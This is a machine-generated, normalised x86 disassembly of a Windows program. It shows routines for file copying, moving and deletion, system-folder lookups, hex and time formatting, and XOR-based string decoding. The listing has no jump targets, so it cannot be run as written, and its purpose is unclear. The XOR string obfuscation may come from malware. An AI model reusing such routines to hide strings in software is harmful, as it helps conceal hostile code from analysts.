call [ FlushFileBuffers@IAT ]
push 0x64
call ebp
sub_2006a50
push ecx
lea edx [ ecx - 0x1 ]
cmp edx 0x2
ja r-xdata
xor eax eax
pop ecx
retn
mov [ edi ] ecx
cmp ecx 0x2
je r-xdata
test eax eax
je r-xdata
cmp ecx 0x3
je r-xdata
mov ecx eax
push esi
lea esi [ ecx + 0x1 ]
lea ebx [ ebx ]
mov [ edi + 0x4 ] 0x0
mov eax 0x1
pop ecx
retn
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx esi
pop esi
je r-xdata
lea edx [ edi + 0x4 ]
sub edx eax
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
mov eax 0x1
pop ecx
retn
sub_2006ab0
sub esp 0x10c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x108 ] eax
push ebx
push esi
mov esi ecx
mov eax [ esi ]
sub eax 0x1
mov ebx edx
je r-xdata
push ebx
call [ DeleteFileA@IAT ]
mov ecx [ esp + 0x110 ]
pop esi
pop ebx
xor ecx esp
call sub_200b53e
add esp 0x10c
retn
sub eax 0x1
je r-xdata
add esi 0x4
push esi
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
jne r-xdata
sub eax 0x1
jne r-xdata
call sub_2007530
push eax
push esi
lea ecx [ esp + 0x18 ]
push r--data
push ecx
call sub_2009be6
add esp 0x10
lea edx [ esp + 0x10 ]
push edx
push ebx
call [ MoveFileA@IAT ]
test eax eax
je r-xdata
push esi
call sub_2006370
add esp 0x4
test eax eax
jne r-xdata
pop esi
xor eax eax
pop ebx
mov ecx [ esp + 0x108 ]
xor ecx esp
call sub_200b53e
add esp 0x10c
retn
push eax
call sub_200b148
mov [ esp + 0xc ] eax
lea eax [ esp + 0xc ]
push eax
mov [ esp + 0x14 ] edx
call sub_200c1a6
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
push ecx
inc edx
push edx
add eax 0x76c
push eax
add esi 0x4
push esi
lea ecx [ esp + 0x28 ]
push r--data
push ecx
call sub_2009be6
add esp 0x20
lea edx [ esp + 0x10 ]
push edx
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
jne r-xdata
push 0x0
lea eax [ esp + 0x14 ]
push eax
push ebx
call [ CopyFileA@IAT ]
test eax eax
je r-xdata
jmp r-xdata
push edi
lea edi [ esp + 0x14 ]
dec edi
lea eax [ esp + 0x10 ]
push eax
call sub_2006370
add esp 0x4
test eax eax
je r-xdata
push ebx
call [ DeleteFileA@IAT ]
pop esi
mov eax 0x1
pop ebx
mov ecx [ esp + 0x108 ]
xor ecx esp
call sub_200b53e
add esp 0x10c
retn
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov cx [ r--data ]
mov [ edi ] cx
call sub_2007530
mov ecx eax
jmp r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
lea edi [ esp + 0x14 ]
sub eax ecx
mov esi ecx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
lea edx [ esp + 0x14 ]
mov ecx eax
push edx
and ecx 0x3
push ebx
[ edi ] [ esi ]
call [ MoveFileA@IAT ]
pop edi
test eax eax
jne r-xdata
sub_2006c60
sub esp 0x104
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x100 ] eax
push esi
push 0x9
mov esi ecx
push r--data
push esi
call sub_200beb0
add esp 0xc
test eax eax
jne r-xdata
push 0xc
push r--data
push esi
call sub_200beb0
add esp 0xc
test eax eax
jne r-xdata
push 0x100
lea eax [ esp + 0x8 ]
push eax
call [ GetWindowsDirectoryA@IAT ]
mov eax esi
lea edx [ eax + 0x1 ]
push 0x8
push r--data
push esi
call sub_200beb0
add esp 0xc
test eax eax
jne r-xdata
push 0x100
lea eax [ esp + 0x8 ]
push eax
call [ GetWindowsDirectoryA@IAT ]
mov eax esi
lea edx [ eax + 0x1 ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
cmp eax 0x9
jne r-xdata
push 0xa
push r--data
push esi
call sub_200beb0
add esp 0xc
test eax eax
jne r-xdata
push 0x100
lea eax [ esp + 0x8 ]
push eax
call [ GetWindowsDirectoryA@IAT ]
mov eax esi
lea edx [ eax + 0x1 ]
nop
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
add esi 0x9
lea eax [ esp + 0x4 ]
mov edx edi
mov ecx eax
sub edx ecx
lea esp [ esp ]
push 0x6
push r--data
push esi
call sub_200beb0
add esp 0xc
test eax eax
jne r-xdata
push 0x100
lea eax [ esp + 0x8 ]
push eax
call [ GetWindowsDirectoryA@IAT ]
mov eax esi
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
cmp eax 0x8
jne r-xdata
sub eax edx
cmp eax 0xc
jne r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
xor eax eax
pop esi
mov ecx [ esp + 0x100 ]
xor ecx esp
call sub_200b53e
add esp 0x104
retn
push 0x9
push r--data
push esi
call sub_200beb0
add esp 0xc
test eax eax
jne r-xdata
lea eax [ esp + 0x4 ]
push eax
push 0x100
call [ GetTempPathA@IAT ]
mov eax esi
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
cmp eax 0xa
jne r-xdata
add esi 0x8
push esi
lea edx [ esp + 0x8 ]
push edx
push r--data
push edi
call sub_2009be6
add esp 0x10
xor eax eax
pop esi
mov ecx [ esp + 0x100 ]
xor ecx esp
call sub_200b53e
add esp 0x104
retn
lea ecx [ esp + 0x4 ]
push ecx
push r--data
push r--data
push edi
call sub_2009be6
add esp 0x10
xor eax eax
pop esi
mov ecx [ esp + 0x100 ]
xor ecx esp
call sub_200b53e
add esp 0x104
retn
add esi 0xc
jmp r-xdata
lea eax [ esp + 0x4 ]
mov edx edi
mov ecx eax
sub edx ecx
mov edx edi
mov eax esi
sub edx esi
nop
push eax
push 0x1a
lea eax [ esp + 0xc ]
push eax
push 0x0
call [ SHGetSpecialFolderPathA@IAT ]
mov eax esi
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
cmp eax 0x6
jne r-xdata
add esi 0xa
push esi
lea edx [ esp + 0x8 ]
push edx
push r--data
push edi
call sub_2009be6
add esp 0x10
xor eax eax
pop esi
mov ecx [ esp + 0x100 ]
xor ecx esp
call sub_200b53e
add esp 0x104
retn
lea ecx [ esp + 0x4 ]
push ecx
push r--data
push edi
call sub_2009be6
add esp 0xc
xor eax eax
pop esi
mov ecx [ esp + 0x100 ]
xor ecx esp
call sub_200b53e
add esp 0x104
retn
push esi
lea edx [ esp + 0x8 ]
push edx
push r--data
push edi
call sub_2009be6
add esp 0x10
xor eax eax
pop esi
mov ecx [ esp + 0x100 ]
xor ecx esp
call sub_200b53e
add esp 0x104
retn
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
xor eax eax
pop esi
mov ecx [ esp + 0x100 ]
xor ecx esp
call sub_200b53e
add esp 0x104
retn
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
mov ecx [ esp + 0x104 ]
pop esi
xor ecx esp
xor eax eax
call sub_200b53e
add esp 0x104
retn
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
cmp eax 0x9
jne r-xdata
add esi 0x6
jmp r-xdata
lea eax [ esp + 0x4 ]
mov edx edi
mov ecx eax
sub edx ecx
lea esp [ esp ]
lea eax [ esp + 0x4 ]
mov edx edi
mov ecx eax
sub edx ecx
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
xor eax eax
pop esi
mov ecx [ esp + 0x100 ]
xor ecx esp
call sub_200b53e
add esp 0x104
retn
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
xor eax eax
pop esi
mov ecx [ esp + 0x100 ]
xor ecx esp
call sub_200b53e
add esp 0x104
retn
sub_2006fc0
push ebp
push esi
push edi
mov esi eax
xor ebp ebp
xor edi edi
test esi esi
jbe r-xdata
mov edx [ esp + 0x14 ]
push edx
call sub_200bbf1
add esp 0x4
pop edi
pop esi
mov eax ebp
pop ebp
retn
lea ecx [ ecx ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
movzx eax ax
push ecx
push eax
sub esi eax
lea eax [ edi + edx ]
push ebx
push eax
call sub_200a8ab
movzx eax ax
mov ecx eax
imul ecx ebx
add esp 0x10
add edi ecx
add ebp eax
test esi esi
ja r-xdata
mov eax 0x7530
movzx eax si
cmp esi 0x7530
jbe r-xdata
sub_2007020
push ebp
push esi
push edi
mov esi eax
xor ebp ebp
xor edi edi
test esi esi
jbe r-xdata
pop edi
pop esi
mov eax ebp
pop ebp
retn
lea ecx [ ecx ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
movzx eax ax
push ecx
push eax
sub esi eax
lea eax [ edi + edx ]
push ebx
push eax
call sub_200a690
movzx eax ax
mov ecx eax
imul ecx ebx
add esp 0x10
add edi ecx
add ebp eax
test esi esi
ja r-xdata
mov eax 0x7530
movzx eax si
cmp esi 0x7530
jbe r-xdata
sub_2007090
mov cl al
sub cl 0x30
cmp cl 0x9
ja r-xdata
mov dl al
sub dl 0x61
cmp dl 0x5
ja r-xdata
movzx eax al
sub eax 0x30
retn
mov cl al
sub cl 0x41
cmp cl 0x5
ja r-xdata
movzx eax al
sub eax 0x57
retn
or eax 0xffffffff
retn
movzx eax al
sub eax 0x37
retn
sub_20070d0
push ebp
mov ebp [ esp + 0x8 ]
push esi
mov ecx ebp
push edi
xor edi edi
lea esi [ ecx + 0x1 ]
mov edi edi
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx esi
mov eax ecx
xor esi esi
test eax eax
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn
push ebx
mov dl cl
sub dl 0x61
cmp dl 0x5
ja r-xdata
movzx ecx cl
sub ecx 0x30
jmp r-xdata
mov dl cl
sub dl 0x41
cmp dl 0x5
ja r-xdata
movzx ecx cl
sub ecx 0x57
jmp r-xdata
mov dl [ esi + ebp + 0x1 ]
mov bl dl
sub bl 0x30
cmp bl 0x9
ja r-xdata
or ecx 0xffffffff
movzx ecx cl
sub ecx 0x37
jmp r-xdata
mov bl dl
sub bl 0x61
cmp bl 0x5
ja r-xdata
movzx edx dl
sub edx 0x30
jmp r-xdata
mov bl dl
sub bl 0x41
cmp bl 0x5
ja r-xdata
movzx edx dl
sub edx 0x57
jmp r-xdata
shl cl 0x4
add cl dl
mov edx [ esp + 0x18 ]
mov [ edi + edx ] cl
inc edi
cmp edi [ esp + 0x1c ]
jge r-xdata
or edx 0xffffffff
movzx edx dl
sub edx 0x37
jmp r-xdata
pop ebx
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ esi + ebp + 0x2 ] 0x20
jne r-xdata
add esi 0x2
cmp esi eax
jl r-xdata
inc esi
mov cl [ esi + ebp ]
mov dl cl
sub dl 0x30
cmp dl 0x9
ja r-xdata
sub_20071b0
push ebx
push esi
push edi
mov edi eax
mov eax 0x55555556
mov ebx edx
imul [ esp + 0x10 ]
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx esi
jge r-xdata
movzx eax [ ebx ]
push eax
push r--data
push edi
call sub_2009be6
add esp 0xc
add edi 0x2
inc ebx
cmp esi 0x1
jle r-xdata
mov esi ecx
mov [ edi ] 0x0
pop edi
lea eax [ esi + esi * 2 - 0x1 ]
pop esi
pop ebx
retn
push ebp
lea ebp [ esi - 0x1 ]
lea esp [ esp ]
movzx ecx [ ebx ]
push ecx
push r--data
push edi
call sub_2009be6
add esp 0xc
add edi 0x3
inc ebx
sub ebp 0x1
jne r-xdata
pop ebp
sub_2007220
sub esp 0x10
push ebx
push ebp
mov ebp [ esp + 0x1c ]
xor ebx ebx
cmp [ esp + 0x20 ] ebx
push esi
mov esi [ esp + 0x28 ]
mov [ esp + 0x10 ] ebx
jle r-xdata
mov edx [ esp + 0x28 ]
pop esi
pop ebp
mov [ ebx + edx ] 0x0
lea eax [ ebx + 0x1 ]
pop ebx
add esp 0x10
retn
sub eax ebp
mov [ esp + 0xc ] 0x4d
mov [ esp + 0x18 ] eax
push edi
lea ecx [ ecx ]
cmp edi 0x8
jne r-xdata
mov edx [ esp + 0x30 ]
cmp [ esp + 0x10 ] edx
jg r-xdata
jge r-xdata
mov [ esi + 0x1e ] 0x2d
pop edi
mov eax [ esp + 0x1c ]
add eax ebp
push eax
push r--data
push esi
call sub_2009be6
push 0x44
lea ecx [ esi + 0x6 ]
push 0x20
push ecx
call sub_2013580
add esp 0x18
add ebx 0x4c
add [ esp + 0x10 ] 0x4c
mov [ esi + 0x4a ] 0xd
mov [ esi + 0x4b ] 0xa
jmp r-xdata
mov eax [ esp + 0x18 ]
lea edx [ esi + edi * 2 ]
lea ecx [ esi + edi * 2 + 0x6 ]
mov [ edi + edx + 0x8 ] al
mov [ edi + ecx + 0x3 ] ah
mov eax [ esp + 0x18 ]
lea edx [ esi + edi * 2 + 0x4 ]
lea ecx [ esi + edi * 2 ]
mov [ edi + edx + 0x2 ] al
mov [ edi + ecx + 0x7 ] ah
jmp r-xdata
mov [ edi + esi + 0x3a ] 0x2e
cmp al 0x7f
ja r-xdata
mov al [ ebp ]
cmp al 0x20
jb r-xdata
mov eax [ esp + 0x14 ]
inc eax
inc ebp
cmp eax [ esp + 0x28 ]
mov [ esp + 0x14 ] eax
jl r-xdata
add esi 0x4c
mov [ edi + esi + 0x3a ] al
jmp r-xdata
movzx eax [ ebp ]
mov edi [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x1c ]
push r--data
push ecx
and edi 0xf
call sub_2009be6
add esp 0xc
test edi edi
jne r-xdata
cmp edi 0xf
jne r-xdata
sub_2007330
push esi
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax 0x1
pop esi
retn
push edi
push esi
call sub_200c43c
add esp 0x8
test eax eax
je r-xdata
xor eax eax
pop esi
retn
mov eax esi
lea edx [ eax + 0x1 ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
cmp [ esi + eax + 0x1 ] cl
lea esi [ esi + eax + 0x1 ]
jne r-xdata
sub_2007370
push esi
mov esi eax
sub esi ecx
mov dl [ ecx ]
mov [ esi + ecx ] dl
inc ecx
test dl dl
jne r-xdata
mov ecx eax
lea esi [ ecx + 0x1 ]
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx esi
mov [ ecx + eax + 0x1 ] dl
pop esi
retn
sub_20073a0
cmp [ eax ] 0x0
push esi
je r-xdata
mov esi eax
mov ecx edi
sub esi edi
lea esp [ esp ]
mov ecx eax
lea esi [ ecx + 0x1 ]
jmp r-xdata
mov dl [ ecx ]
mov [ esi + ecx ] dl
inc ecx
test dl dl
jne r-xdata
mov ecx eax
lea esi [ ecx + 0x1 ]
nop
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx esi
mov [ ecx + eax + 0x1 ] dl
pop esi
retn
sub ecx esi
cmp [ eax + ecx + 0x1 ] dl
lea eax [ eax + ecx + 0x1 ]
jne r-xdata
sub_20073f0
push edi
xor edi edi
cmp [ ecx ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
pop edi
retn
push esi
lea esp [ esp ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax esi
lea edi [ edi + eax + 0x1 ]
mov eax ecx
lea esi [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax esi
cmp [ ecx + eax + 0x1 ] dl
lea ecx [ ecx + eax + 0x1 ]
jne r-xdata
mov eax ecx
lea esi [ eax + 0x1 ]
pop esi
sub_2007430
push 0x0
push eax
push esi
push 0x400
call [ GetLastError@IAT ]
push eax
push 0x0
push 0x1000
call [ FormatMessageA@IAT ]
xor ecx ecx
cmp ecx eax
sbb eax eax
and eax esi
retn
sub_2007460
push esi
mov ecx eax
push edi
lea esi [ ecx + 0x1 ]
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx esi
dec ecx
sub ecx 0x1
mov [ ecx + eax + 0x1 ] 0x0
jns r-xdata
cmp dl 0x9
jne r-xdata
mov dl [ ecx + eax ]
cmp dl 0x20
je r-xdata
mov esi eax
push ebx
xor ecx ecx
xor edi edi
lea ebx [ esi + 0x1 ]
mov dl [ esi ]
inc esi
test dl dl
jne r-xdata
sub esi ebx
pop ebx
lea esp [ esp ]
inc ecx
cmp ecx esi
jl r-xdata
cmp dl 0x9
jne r-xdata
mov dl [ ecx + eax ]
cmp dl 0x20
je r-xdata
test ecx ecx
je r-xdata
pop edi
pop esi
retn
cmp ecx esi
jge r-xdata
mov [ edi + eax ] 0x0
lea ebx [ ebx ]
mov dl [ ecx + eax ]
mov [ edi + eax ] dl
inc ecx
inc edi
cmp ecx esi
jl r-xdata
sub_20074e0
push edi
push ebx
push esi
call sub_200c1cd
add esp 0xc
test eax eax
je r-xdata
xor eax eax
retn
cmp [ esi ] 0x23
je sub_20074e0
mov eax esi
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
add eax 0xffffffff
js r-xdata
mov eax esi
retn
mov edi edi
sub eax 0x1
mov [ eax + esi + 0x1 ] 0x0
jns r-xdata
cmp cl 0xa
jne r-xdata
mov cl [ eax + esi ]
cmp cl 0xd
je r-xdata
sub_2007530
mov eax ebx
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
push esi
sub eax edx
mov ecx ebx
push edi
lea eax [ eax + ebx - 0x1 ]
mov esi 0x1
lea edi [ ecx + 0x1 ]
mov edi edi
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx edi
cmp ecx 0x1
jle r-xdata
pop edi
pop esi
retn
mov edi edi
inc eax
mov ecx ebx
dec eax
inc esi
lea edi [ ecx + 0x1 ]
lea esp [ esp ]
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx edi
cmp esi ecx
jl r-xdata
cmp [ eax ] 0x5c
je r-xdata
pop edi
pop esi
retn
sub_2007590
mov eax ebx
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
push esi
sub eax edx
mov ecx ebx
push edi
lea eax [ eax + ebx - 0x1 ]
xor esi esi
lea edi [ ecx + 0x1 ]
jmp r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx edi
test ecx ecx
jle r-xdata
pop edi
pop esi
retn
lea ecx [ ecx ]
inc eax
mov ecx ebx
dec eax
inc esi
lea edi [ ecx + 0x1 ]
lea esp [ esp ]
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx edi
cmp esi ecx
jl r-xdata
cmp [ eax ] 0x2f
je r-xdata
pop edi
pop esi
retn
sub_20075f0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push esi
push edi
test eax eax
jl r-xdata
push 0x0
push 0xe10
push eax
push ecx
call sub_2025ab0
mov esi eax
mov [ esp + 0x18 ] ebx
mov [ esp + 0x18 ] edx
mov eax 0x88888889
mul ecx
shr edx 0x5
mov eax edx
shl eax 0x4
sub eax edx
add eax eax
add eax eax
sub ecx eax
push ecx
push edx
push esi
push r--data
push ebp
call [ wsprintfA@IAT ]
add esp 0x14
jg r-xdata
mov al [ ebp ]
inc ebp
test al al
jne r-xdata
pop edi
sub ebp ecx
pop esi
mov eax ebp
pop ebp
pop ebx
retn
push 0x0
push 0x1e13380
push eax
push ecx
call sub_2025ab0
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] ebx
mov [ esp + 0x18 ] edx
mov eax 0xcf2049a1
mul ecx
mov esi edx
shr esi 0x15
mov eax esi
imul eax eax 0xffd87300
add ecx eax
mov eax 0xc22e4507
mul ecx
mov edi edx
shr edi 0x10
mov edx edi
imul edx edx 0xfffeae80
add ecx edx
mov eax 0x91a2b3c5
mul ecx
mov ebx edx
shr ebx 0xb
mov eax ebx
imul eax eax 0xfffff1f0
add ecx eax
mov eax 0x88888889
mul ecx
shr edx 0x5
mov eax edx
shl eax 0x4
sub eax edx
add eax eax
add eax eax
sub ecx eax
push ecx
mov ecx [ esp + 0x18 ]
push edx
push ebx
push edi
push esi
push ecx
push r--data
push ebp
call [ wsprintfA@IAT ]
add esp 0x20
jmp r-xdata
cmp ecx 0x1e13380
jbe r-xdata
lea ecx [ ebp + 0x1 ]
lea esp [ esp ]
test eax eax
jl r-xdata
jg r-xdata
push 0x0
push 0x278d00
push eax
push ecx
call sub_2025ab0
mov [ esp + 0x18 ] ebx
mov ebx eax
mov [ esp + 0x18 ] edx
mov eax 0xc22e4507
mul ecx
mov esi edx
shr esi 0x10
mov edx esi
imul edx edx 0xfffeae80
add ecx edx
mov eax 0x91a2b3c5
mul ecx
mov edi edx
shr edi 0xb
mov eax edi
imul eax eax 0xfffff1f0
add ecx eax
mov eax 0x88888889
mul ecx
shr edx 0x5
mov eax edx
shl eax 0x4
sub eax edx
add eax eax
add eax eax
sub ecx eax
push ecx
push edx
push edi
push esi
push ebx
push r--data
push ebp
call [ wsprintfA@IAT ]
add esp 0x1c
jmp r-xdata
cmp ecx 0x278d00
jbe r-xdata
test eax eax
jl r-xdata
jg r-xdata
push 0x0
push 0x15180
push eax
push ecx
call sub_2025ab0
mov edi eax
mov [ esp + 0x18 ] ebx
mov [ esp + 0x18 ] edx
mov eax 0x91a2b3c5
mul ecx
mov esi edx
shr esi 0xb
mov edx esi
imul edx edx 0xfffff1f0
add ecx edx
mov eax 0x88888889
mul ecx
shr edx 0x5
mov eax edx
shl eax 0x4
sub eax edx
add eax eax
add eax eax
sub ecx eax
push ecx
push edx
push esi
push edi
push r--data
push ebp
call [ wsprintfA@IAT ]
add esp 0x18
jmp r-xdata
cmp ecx 0x15180
jbe r-xdata
sub_2007800
push ecx
test esi esi
jne r-xdata
mov eax esi
lea edx [ eax + 0x1 ]
mov edi edi
xor eax eax
pop ecx
retn
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
mov edx edi
mov eax esi
sub edx esi
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
mov eax esi
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
dec eax
test eax eax
jle r-xdata
mov eax 0x1
pop ecx
retn
mov edi edi
mov [ eax + edi ] 0x0
dec eax
test eax eax
jg r-xdata
cmp [ eax + edi ] 0x5c
je r-xdata
mov eax 0x1
pop ecx
retn
sub_2007860
push ecx
test esi esi
je r-xdata
xor eax eax
pop ecx
retn
mov eax esi
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
mov eax esi
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
dec eax
test eax eax
jle r-xdata
mov edi edi
lea eax [ eax + esi + 0x1 ]
pop ecx
retn
dec eax
test eax eax
jg r-xdata
cmp [ eax + esi ] 0x2e
je r-xdata
sub_20078b0
mov eax edi
push esi
xor edx edx
lea esi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
test eax eax
jle r-xdata
mov eax 0x1
pop esi
retn
mov al [ edx + edi ]
cmp al 0x60
jle r-xdata
mov eax edi
inc edx
lea esi [ eax + 0x1 ]
jmp r-xdata
cmp al 0x7b
jge r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub al 0x20
mov [ edx + edi ] al
sub eax esi
cmp edx eax
jl r-xdata
sub_2007900
mov eax edi
push esi
xor edx edx
lea esi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
test eax eax
jle r-xdata
mov eax 0x1
pop esi
retn
mov al [ edx + edi ]
cmp al 0x40
jle r-xdata
mov eax edi
inc edx
lea esi [ eax + 0x1 ]
jmp r-xdata
cmp al 0x5b
jge r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
add al 0x20
mov [ edx + edi ] al
sub eax esi
cmp edx eax
jl r-xdata
sub_2007950
push ebx
push ebp
mov ebp [ esp + 0x10 ]
mov ebx eax
push esi
mov eax ebp
push edi
lea edx [ eax + 0x1 ]
nop
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov esi eax
cmp esi ebx
mov edi esi
jl r-xdata
mov ebx [ esp + 0x14 ]
push esi
push ebp
push ebx
call sub_2013e10
add esp 0xc
mov eax edi
pop edi
mov [ esi + ebx ] 0x0
pop esi
pop ebp
pop ebx
retn
lea esi [ ebx - 0x1 ]
sub_2007990
mov eax [ esp + 0x4 ]
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push esi
push edi
lea edx [ eax + 0x1 ]
nop
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov edi eax
mov eax [ esp + 0x18 ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov esi eax
lea ebx [ esi + edi ]
cmp ebx ebp
jl r-xdata
test esi esi
jle r-xdata
sub ebp edi
dec ebp
mov esi ebp
pop edi
pop esi
pop ebp
mov eax ebx
pop ebx
retn
mov eax [ esp + 0x18 ]
mov ebp [ esp + 0x14 ]
push esi
push eax
lea ecx [ edi + ebp ]
push ecx
call sub_2013e10
add esp 0xc
add esi edi
mov [ esi + ebp ] 0x0
sub_20079f0
xor eax eax
test esi esi
je r-xdata
retn
test ecx ecx
jle r-xdata
dec ecx
jmp r-xdata
mov dl [ esi + ecx ]
cmp dl 0xd
je r-xdata
mov edx ecx
mov [ esi + ecx ] 0x0
inc eax
dec ecx
test edx edx
jne r-xdata
cmp dl 0xa
jne r-xdata
sub_2007a20
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
mov eax ebp
push edi
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov esi eax
mov eax [ esp + 0x18 ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov ebx eax
mov eax 0x1
sub eax ebx
add esi eax
xor edi edi
test esi esi
jle r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
lea esp [ esp ]
pop edi
pop esi
mov eax ebp
pop ebp
pop ebx
retn
inc edi
inc ebp
cmp edi esi
jl r-xdata
mov ecx [ esp + 0x18 ]
push ebx
push ecx
push ebp
call sub_200beb0
add esp 0xc
test eax eax
je r-xdata
sub_2007a90
push esi
mov esi eax
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
mov cl [ esi ]
xor eax eax
test cl cl
je r-xdata
mov [ edx ] 0x0
pop esi
retn
cmp cl 0x20
je r-xdata
cmp [ edx - 0x1 ] 0x20
je r-xdata
cmp cl 0x9
je r-xdata
mov cl [ esi + 0x1 ]
inc esi
test cl cl
jne r-xdata
mov [ edx ] 0x20
mov [ edx ] cl
jmp r-xdata
inc edx
inc eax
sub_2007ad0
mov eax ecx
push esi
lea esi [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax esi
mov esi eax
xor eax eax
test esi esi
jle r-xdata
mov [ eax + ebx ] 0x0
pop esi
retn
mov edx ebx
push edi
sub edx ecx
mov edi esi
mov edi edi
mov [ edx + ecx ] al
inc ecx
sub edi 0x1
jne r-xdata
xor al 0x55
mov al [ ecx ]
cmp al 0x55
je r-xdata
pop edi
mov [ esi + ebx ] 0x0
pop esi
retn
sub_2007b10
test eax eax
jle r-xdata
retn
push esi
sub edx ecx
mov esi eax
lea esp [ esp ]
mov [ edx + ecx ] al
inc ecx
sub esi 0x1
jne r-xdata
cmp al 0x55
je r-xdata
mov al [ ecx ]
test al al
je r-xdata
pop esi
xor al 0x55
sub_2007b40
sub esp 0x88
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x84 ] eax
push ebx
push esi
push edi
mov edi edx
mov eax ecx
mov [ esp + 0xc ] edi
lea esi [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
mov edx [ r--data ]
sub eax esi
mov ebx eax
mov eax [ r--data ]
mov [ esp + 0x10 ] eax
mov ax [ r--data ]
xor esi esi
mov [ esp + 0x14 ] edx
mov [ esp + 0x18 ] ax
test ebx ebx
jle r-xdata
mov ecx [ esp + 0x90 ]
mov [ edi + esi ] 0x0
pop edi
pop esi
pop ebx
xor ecx esp
call sub_200b53e
add esp 0x88
retn
sub edi ecx
push ebp
mov [ edi + ecx ] al
inc esi
inc ecx
cmp esi ebx
jl r-xdata
xor al dl
mov eax esi
cdq
mov ebp 0x9
idiv ebp
mov al [ ecx ]
mov dl [ esp + edx + 0x14 ]
cmp al dl
je r-xdata
mov ecx [ esp + 0x10 ]
pop ebp
pop edi
mov [ ecx + esi ] 0x0
pop esi
pop ebx
mov ecx [ esp + 0x84 ]
xor ecx esp
call sub_200b53e
add esp 0x88
retn
sub_2007bf0
sub esp 0x84
mov eax [ rw-data ]
